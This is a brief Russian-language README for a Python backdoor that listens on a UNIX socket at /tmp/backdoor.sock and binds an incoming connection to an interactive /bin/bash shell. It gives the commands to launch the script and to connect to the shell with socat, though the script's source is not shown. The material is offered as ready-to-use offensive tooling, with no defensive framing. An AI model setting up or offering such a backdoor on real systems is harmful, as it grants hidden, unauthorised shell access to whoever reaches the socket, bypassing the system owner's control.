
Бэкдор на основе UNIX сокетов (`AF_UNIX`, `SOCK_STREAM`).

Сервер создаёт сокет `/tmp/backdoor.sock`, принимает одно соединение
и перенаправляет его файловый дескриптор на `stdin/stdout/stderr` оболочки `/bin/bash`.

---
запуск бэкдора:

```bash
python3 backdoor.py
```

подключение через `socat`:

```bash
socat - UNIX:/tmp/backdoor.sock
```
